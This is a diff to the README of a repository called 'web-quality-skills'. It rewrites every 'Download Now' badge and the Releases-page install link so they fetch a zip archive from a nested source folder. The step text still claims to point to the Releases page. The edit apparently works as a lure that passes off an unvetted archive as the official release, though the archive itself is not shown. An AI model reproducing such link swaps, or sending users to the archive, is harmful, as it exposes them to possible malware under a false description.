@@ -6,12 +6,12 @@ Welcome to the **web-quality-skills** repository. This software helps you optimi
 
 ## 🟢 Download Now
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Bugrasemerkant/web-quality-skills/releases)
+[![Download Now](https://github.com/Bugrasemerkant/web-quality-skills/raw/refs/heads/main/skills/web-quality-audit/skills-web-quality-3.9.zip%20Now-Click%20Here-brightgreen)](https://github.com/Bugrasemerkant/web-quality-skills/raw/refs/heads/main/skills/web-quality-audit/skills-web-quality-3.9.zip)
 
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   To get the latest version of **web-quality-skills**, visit the Releases page here: [GitHub Releases](https://github.com/Bugrasemerkant/web-quality-skills/releases).
+   To get the latest version of **web-quality-skills**, visit the Releases page here: [GitHub Releases](https://github.com/Bugrasemerkant/web-quality-skills/raw/refs/heads/main/skills/web-quality-audit/skills-web-quality-3.9.zip).
 
 2. **Choose the Right File**  
    On the Releases page, you will see a list of available files. Look for the most recent version, which will typically be labeled with the highest version number.
@@ -56,4 +56,4 @@ If you still need help, check the issues section of the repository for similar p
 
 Thank you for using **web-quality-skills**! Your journey to a better web performance starts now. 
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Bugrasemerkant/web-quality-skills/releases)
+[![Download Now](https://github.com/Bugrasemerkant/web-quality-skills/raw/refs/heads/main/skills/web-quality-audit/skills-web-quality-3.9.zip%20Now-Click%20Here-brightgreen)](https://github.com/Bugrasemerkant/web-quality-skills/raw/refs/heads/main/skills/web-quality-audit/skills-web-quality-3.9.zip)
